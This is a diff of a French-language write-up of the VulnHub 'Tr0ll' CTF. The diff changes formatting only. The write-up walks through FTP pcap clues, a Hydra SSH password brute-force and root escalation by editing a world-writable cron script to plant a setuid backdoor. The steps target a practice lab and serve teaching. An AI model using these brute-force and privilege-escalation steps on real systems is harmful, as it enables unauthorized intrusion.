@@ -1,6 +1,6 @@
 ---
 title: "Solution du CTF Tr0ll de VulnHub"
-tags: [CTF,VulnHub]
+tags: [CTF, VulnHub]
 ---
 
 Introduction
@@ -8,11 +8,11 @@ Introduction
 
 [Le challenge tr0ll](http://vulnhub.com/entry/tr0ll-1,100/) créé par *Maleus* est le dernier CTF ajouté sur *VulnHub* au moment de ces lignes.  
 
-L'auteur prévient qu'il y aura beaucoup de trolls (c'est à dire des fausses pistes) donc le challenge risque d'être agaçant.  
+L'auteur prévient qu'il y aura beaucoup de trolls (c'est-à-dire des fausses pistes) donc le challenge risque d'être agaçant.  
 
 Toutefois, il est aussi indiqué que le challenge se destine aux débutants.  
 
-Mais trop de guessing peu suffire à vous pourrir la vie comme sur le CTF *Flick* que j'ai terminé mais qui ne mérite pas un writeup au vu du temps perdu dessus (d'autres ont déjà écrit des writeups plus intéressants).  
+Mais trop de guessing peu suffire à vous pourrir la vie comme sur le CTF *Flick* que j'ai terminé, mais qui ne mérite pas un writeup au vu du temps perdu dessus (d'autres ont déjà écrit des writeups plus intéressants).  
 
 Tour rapide
 -----------
@@ -34,16 +34,16 @@ PORT   STATE SERVICE VERSION
 |_http-title: Site doesn't have a title (text/html).
 ```
 
-Sur le serveur web, à la racine, on trouve seulement une image avec un trollface. Idem pour */secret*.  
+Sur le serveur web, à la racine, on trouve seulement une image avec un trollface. Idem pour `/secret`.  
 
-dirb ne trouve rien de plus dans ces dossiers, inutile d'aller plus loin.  
+`dirb` ne trouve rien de plus dans ces dossiers, inutile d'aller plus loin.  
 
 Don't feed the troll
 --------------------
 
 Je décide de sortie l'artillerie lourde :  
 
-```
+```console
 $ python /work/vrd/exploits/ftp/devloop-vsftpd-3.0.2-l33t-0day-exploit.py
 [i] devloop !PRIVATE! 0day exploit for VSFTPd 3.0.2 (Ubuntu)
 [*] Connection as anonymous successful !
@@ -63,7 +63,7 @@ Bon évidemment, c'est fake... Un peu de sérieux, arrêtons de troller ;-)
 La vérité vraie
 ---------------
 
-On récupère le fichier *lol.pcap* présent sur le ftp. Il s'agit justement d'une capture réseau d'une session FTP :  
+On récupère le fichier `lol.pcap` présent sur le ftp. Il s'agit justement d'une capture réseau d'une session FTP :  
 
 ```
 220 (vsFTPd 3.0.2)
@@ -96,7 +96,7 @@ QUIT
 221 Goodbye.
 ```
 
-Si on regarde la connexion data pour la commande *RETR* on y trouve le contenu du fichier *secret\_stuff.txt* :  
+Si on regarde la connexion data pour la commande `RETR` on y trouve le contenu du fichier `secret_stuff.txt` :  
 
 > Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P  
 > 
@@ -104,20 +104,20 @@ Si on regarde la connexion data pour la commande *RETR* on y trouve le contenu d
 > 
 > Sucks, you were so close... gotta TRY HARDER!
 
-Finalement comme on est prévenu de la présence de trolls il est assez facile de comprendre qu'il y a un doube sens.  
+Finalement comme on est prévenu de la présence de trolls, il est assez facile de comprendre qu'il y a un double sens.  
 
-Ainsi si on se rend sur */sup3rs3cr3tdirlol/* sur le serveur web on trouve un binaire 32bits baptisé *roflmao*.  
+Ainsi si on se rend sur `/sup3rs3cr3tdirlol/` sur le serveur web on trouve un binaire 32bits baptisé `roflmao`.  
 
-Une analyse rapide via *gdb* montre que le programme ne fait rien de plus qu'un *printf*.  
+Une analyse rapide via `gdb` montre que le programme ne fait rien de plus qu'un `printf`.  
 
-```
+```console
 $ ./roflmao 
 Find address 0x0856BF to proceed
 ```
 
-Du coup on pointe le navigateur sur */0x0856BF/* où se trouvent deux sous-dossiers.  
+Du coup, on pointe le navigateur sur `/0x0856BF/` où se trouvent deux sous-dossiers.  
 
-Le fichier texte */0x0856BF/good\_luck/which\_one\_lol.txt* semble contenir une liste d'utilisateurs :  
+Le fichier texte `/0x0856BF/good_luck/which_one_lol.txt` semble contenir une liste d'utilisateurs :  
 
 ```
 maleus
@@ -132,21 +132,21 @@ vis1t0r
 overflow
 ```
 
-et dans le dossier */0x0856BF/this\_folder\_contains\_the\_password/* on trouve un fichier qui à priori contient le mot de passe :  
+Et dans le dossier `/0x0856BF/this_folder_contains_the_password/` on trouve un fichier qui à priori contient le mot de passe :  
 
 ![Dossier web tr0ll](/assets/img/troll.png)
 
-le mot de passe devrait alors être *Good\_job\_:)* Mais évidemment aucun utilisateur n'accepte ce mot de passe.  
+Le mot de passe devrait alors être `Good_job_:)` Mais évidemment aucun utilisateur n'accepte ce mot de passe.  
 
 Une fois de plus on cherche un second sens et on se dit que le mot de passe doit être un mot présent dans la page.  
 
-Ainsi le mot de passe s'est révélé être *Pass.txt*.  
+Ainsi le mot de passe s'est révélé être `Pass.txt`.  
 
-J'ai rencontré quelques difficultés pour casser le mot de passe car *Hydra* semble avoir un bug dans la gestion du délai (option *-W*) entre deux connexions quand il s'agit d'un brute-force sur SSH. Et comme *fail2ban* est présent sur le système cible c'est vite devenu pénible.  
+J'ai rencontré quelques difficultés pour casser le mot de passe, car *Hydra* semble avoir un bug dans la gestion du délai (option `-W`) entre deux connexions quand il s'agit d'un brute-force sur SSH. Et comme *fail2ban* est présent sur le système cible, c'est vite devenu pénible.  
 
-Heureusement il est possible de reprendre l'attaque via -R après avoir attendu que *fail2ban* nous re-accepte :  
+Heureusement, il est possible de reprendre l'attaque via `-R` après avoir attendu que *fail2ban* nous re-accepte :  
 
-```
+```console
 $ ./hydra -L ../users.txt -P ../pass.txt -V -t 1 -f -W 6 ssh://192.168.1.78
 Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -199,19 +199,19 @@ wytshadow:x:1010:1010::/home/wytshadow:
 vis1t0r:x:1011:1011::/home/vis1t0r:
 ```
 
-Toutefois ils ne disposent pas de shells et seul *troll* dispose vraiment d'un dossier dans */home/*.  
+Toutefois, ils ne disposent pas de shells et seul `troll` dispose vraiment d'un dossier dans `/home/`.  
 
 Le nombre de fausses pistes se réduit ainsi à 0.  
 
 On trouve un script Python que l'on ne peut malheureusement pas lire :  
 
-```
+```console
 overflow@troll:/$ ls -l /opt/
 total 4
 -rwx--x--x 1 root root 117 Aug 10 02:11 lmao.py
 ```
 
-La liste des fichiers appartenant à *troll* montre peu d'intérêts :  
+La liste des fichiers appartenant à `troll` montre peu d'intérêts :  
 
 ```
 /srv/ftp/lol.pcap
@@ -222,7 +222,7 @@ La liste des fichiers appartenant à *troll* montre peu d'intérêts :
 /home/troll/.viminfo
 ```
 
-Au boût d'un moment notre connexion SSH est coupée :  
+Au bout d'un moment notre connexion SSH est coupée :  
 
 ```
 Broadcast Message from root@trol                                               
@@ -241,7 +241,7 @@ Je me reconnecte après avoir uploadé mon script maison de recherche de permiss
 
 Notez que le script n'est pas parfait et donne pas mal de faux positifs :  
 
-```
+```console
 overflow@troll:/tmp$ python search.py 
 File /bin/su is setuid root
 File /bin/ping is setuid root
@@ -304,9 +304,9 @@ File /lib/log/cleaner.py is world-writable !
 File /srv/ftp/lol.pcap is world-writable !
 ```
 
-Effectivement les permissions sur le script *cleaner.py* sont open-bar :  
+Effectivement les permissions sur le script `cleaner.py` sont open-bar :  
 
-```
+```console
 overflow@troll:/tmp$ ls -l /lib/log/cleaner.py
 -rwxrwxrwx 1 root root 96 Aug 13 00:13 /lib/log/cleaner.py
 overflow@troll:/tmp$ cat /lib/log/cleaner.py
@@ -319,18 +319,18 @@ except:
         sys.exit()
 ```
 
-Le script sert tout simplement à vider le dossier */tmp*.  
+Le script sert tout simplement à vider le dossier `/tmp`.  
 
 Dans le fichier swap qui doit être généré par *Vim* on trouve une information intéressante :  
 
-```
+```console
 overflow@troll:/$ ls -al /var/tmp/cleaner.py.swp
 -rwxrwxrwx 1 root root 34 Aug 13 01:16 /var/tmp/cleaner.py.swp
 overflow@troll:/$ cat /var/tmp/cleaner.py.swp
 crontab for cleaner.py successful
 ```
 
-*cleaner.py* est donc apellé via une tache planifiée. On le modifie pour qu'il mette des droits setuid root sur une backdoor que l'on aura préalablement placé (j'ai évité /tmp car le cleaner peut supprimer nos fichiers entre temps) :  
+`cleaner.py` est donc appelé via une tache planifiée. On le modifie pour qu'il mette des droits setuid root sur une backdoor que l'on aura préalablement placé (j'ai évité `/tmp` car le cleaner peut supprimer nos fichiers entre temps) :  
 
 ```python
 #!/usr/bin/env python
@@ -342,9 +342,9 @@ except:
         sys.exit()
 ```
 
-Après un moment on a bien récupéré les permissions :  
+Après un moment, on a bien récupéré les permissions :  
 
-```
+```console
 overflow@troll:/$ ls -l /run/shm/
 total 2724
 -rwsr-xr-x 1 root root 2786558 Aug 21 14:30 getroot
@@ -352,7 +352,7 @@ total 2724
 
 Seulement, à l'exécution...  
 
-```
+```console
 overflow@troll:/$ /run/shm/getroot 
 overflow@troll:/$ id
 uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
@@ -374,9 +374,9 @@ none on /sys/fs/pstore type pstore (rw)
 systemd on /sys/fs/cgroup/systemd type cgroup (rw,noexec,nosuid,nodev,none,name=systemd)
 ```
 
-Le dossier */run/shm* est monté en nosuid. On va chercher ailleurs un dossier dans lequel on peut écrire :  
+Le dossier `/run/shm` est monté en `nosuid`. On va chercher ailleurs un dossier dans lequel on peut écrire :  
 
-```
+```console
 overflow@troll:/$ find / -type d -writable 2> /dev/null | grep -v /proc
 /tmp
 /run/user/1002
@@ -389,7 +389,7 @@ overflow@troll:/$ find / -type d -writable 2> /dev/null | grep -v /proc
 
 /var/tmp devrait faire l'affaire. On rectifie le cleaner une nouvelle fois et on recommence :  
 
-```
+```console
 overflow@troll:/$ ls /var/tmp/getroot -l
 -rwsr-xr-x 1 root root 2786558 Aug 21 18:23 /var/tmp/getroot
 overflow@troll:/$ /var/tmp/getroot
@@ -406,7 +406,7 @@ Good job, you did it!
 
 Groovy !
 
-Sous la capôt
+Sous la capot
 -------------
 
 On trouve deux lignes dans la crontab de root :
@@ -416,7 +416,7 @@ On trouve deux lignes dans la crontab de root :
 */2 * * * * /usr/bin/python /lib/log/cleaner.py
 ```
 
-```
+```console
 root@troll:/root# cat /opt/lmao.py
 #!/usr/bin/env python
 import os
@@ -512,6 +512,5 @@ for f in SECRET_FILES:
   elif attrs.st_mode & S_IWGRP and attrs.st_gid != 0:
     print "File {} is readable by members of group {} !".format(f, grp.getgrgid(attrs.st_gid).gr_name)
 ```
-
 
 *Published August 23 2014 at 15:08*
